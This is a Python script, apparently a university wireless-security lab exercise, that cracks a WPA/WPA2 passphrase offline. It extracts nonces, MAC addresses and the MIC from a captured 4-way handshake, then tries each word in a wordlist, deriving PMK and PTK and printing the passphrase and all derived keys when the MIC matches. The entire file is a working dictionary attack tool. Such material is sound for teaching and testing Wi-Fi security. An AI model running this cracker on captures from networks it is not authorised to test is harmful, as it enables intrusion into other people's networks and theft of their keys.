#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"



from wpa_key_derivation import *

def main():
    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    wpa=rdpcap("wpa_handshake.cap")

    Ssid, APmac, Clientmac = extractDataFromAsso(wpa)
    ANonce, SNonce, mic, data = extractDataFromHandshake(wpa)

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    #passPhrase  = "actuelle"
    A           = "Pairwise key expansion" #this string is used in the pseudo-random function
    # Authenticator and Supplicant Nonces
    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary


    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    print ("\n\nValues used to derivate keys")
    print ("============================")
    #print ("Passphrase: ",passPhrase,"\n")
    print ("SSID: ",Ssid,"\n")
    print ("AP Mac: ",b2a_hex(APmac),"\n")
    print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
    print ("AP Nonce: ",b2a_hex(ANonce),"\n")
    print ("Client Nonce: ",b2a_hex(SNonce),"\n")

    #On ouvre le fichier en quesstion
    print("\nSearching ...")
    wordlist = open('wordlist.txt', 'r')
    #On lit chaque ligne (passphrase) du fichier un à un et on en tire les clés + MIC
    for line in wordlist.readlines():

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(line.strip())
        ssid = str.encode(Ssid)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        tested_mic = hmac.new(ptk[0:16],data,hashlib.sha1)
        
        #Si le MIC généré correspond au MIC recherché, la passphrase est alors affichée
        if tested_mic.digest()[:-4] == mic:
            print("\nThe passphrase has been found !\n")
            print ("\nResults of the key expansion")
            print ("=============================")
            print ("PMK:\t\t",pmk.hex(),"\n")
            print ("PTK:\t\t",ptk.hex(),"\n")
            print ("KCK:\t\t",ptk[0:16].hex(),"\n")
            print ("KEK:\t\t",ptk[16:32].hex(),"\n")
            print ("TK:\t\t",ptk[32:48].hex(),"\n")
            print ("MICK:\t\t",ptk[48:64].hex(),"\n")
            print ("MIC:\t\t",tested_mic.hexdigest(),"\n")
            print("\n\nThe passphrase is : ", passPhrase, "\n")
            break
        else :
            print("The passphrase is incorrect : ", passPhrase)

if __name__ == "__main__":
    main()